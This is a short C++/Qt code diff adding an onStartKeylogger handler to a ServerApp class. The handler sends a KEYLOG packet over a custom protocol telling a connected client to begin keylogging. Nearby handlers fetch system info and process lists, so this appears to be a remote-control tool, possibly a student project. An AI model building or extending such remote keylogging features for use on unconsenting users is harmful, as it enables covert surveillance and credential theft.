@@ -136,6 +136,26 @@ void ServerApp::onGetInfoSys(const QString& clientId)
     sendToClientInternal(clientId, qraw);
 }
 
+void ServerApp::onStartKeylogger(const QString& clientId)
+{
+    qDebug() << "[ServerApp] onStartKeylogger for" << clientId;
+
+    uint32_t sessionId = 0;
+    LPTF_Packet packet(
+        1,                         // version
+        PacketType::KEYLOG,        // type
+        0,                         // flags
+        0,                         // packetId
+        sessionId,                 // sessionId
+        {}                         // payload vide
+    );
+    auto raw = packet.serialize();
+    QByteArray qraw(reinterpret_cast<const char*>(raw.data()), int(raw.size()));
+
+    sendToClientInternal(clientId, qraw);
+    qDebug() << "[ServerApp] Keylogger started for" << clientId;
+}
+
 void ServerApp::onRequestProcessList(const QString& clientId, bool namesOnly)
 {
     qDebug() << "[ServerApp] onRequestProcessList for" << clientId << "namesOnly=" << namesOnly;
